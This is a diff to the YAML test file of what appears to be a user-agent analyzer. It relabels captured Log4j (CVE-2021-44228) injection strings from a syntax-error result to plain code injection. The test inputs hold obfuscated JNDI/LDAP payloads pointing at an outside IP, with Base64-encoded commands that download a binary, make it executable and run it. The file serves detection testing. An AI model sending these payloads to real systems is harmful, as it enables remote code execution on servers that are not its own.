@@ -40,33 +40,8 @@ isCodeInjection: &isCodeInjection
       AgentNameVersionMajor                : 'Hacker'
       HackerAttackVector                   : 'Code Injection'
       HackerToolkit                        : 'Unknown'
+      RemarkablePattern                    : 'Hacker'
 
-isCodeInjectionSyntaxError: &isCodeInjectionSyntaxError
-      DeviceClass                          : 'Hacker'
-      DeviceName                           : 'Hacker'
-      DeviceBrand                          : 'Hacker'
-      DeviceVersion                        : 'Hacker'
-      OperatingSystemClass                 : 'Hacker'
-      OperatingSystemName                  : 'Hacker'
-      OperatingSystemVersion               : 'Hacker'
-      OperatingSystemVersionMajor          : 'Hacker'
-      OperatingSystemNameVersion           : 'Hacker'
-      OperatingSystemNameVersionMajor      : 'Hacker'
-      LayoutEngineClass                    : 'Hacker'
-      LayoutEngineName                     : 'Hacker'
-      LayoutEngineVersion                  : 'Hacker'
-      LayoutEngineVersionMajor             : 'Hacker'
-      LayoutEngineNameVersion              : 'Hacker'
-      LayoutEngineNameVersionMajor         : 'Hacker'
-      AgentClass                           : 'Hacker'
-      AgentName                            : 'Hacker'
-      AgentVersion                         : 'Hacker'
-      AgentVersionMajor                    : 'Hacker'
-      AgentNameVersion                     : 'Hacker'
-      AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'Code Injection'
-      HackerToolkit                        : 'Unknown'
-      __SyntaxError__                      : 'true'
 
 config:
 # Real attempts I got at home trying Apache Log4j RCE CVE-2021-44228
@@ -308,7 +283,7 @@ config:
 - test:
     input:
       user_agent_string: '${jndi:ldap://sidn-divd-c73pn46j8c872orc95f0_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
-    expected: *isCodeInjectionSyntaxError
+    expected: *isCodeInjection
 
 - test:
     input:
@@ -338,12 +313,12 @@ config:
 - test:
     input:
       user_agent_string: 't(''${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}'')'
-    expected: *isCodeInjectionSyntaxError
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 't(''${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3N0YXI7IGN1cmwgLU8gaHR0cDovLzIuNTguMTQ5LjIwNi9zdGFyOyBjaG1vZCA3Nzcgc3RhcjsgLi9zdGFyIGV4cGxvaXQ=}'
-    expected: *isCodeInjectionSyntaxError
+    expected: *isCodeInjection
 
 - test:
     input:
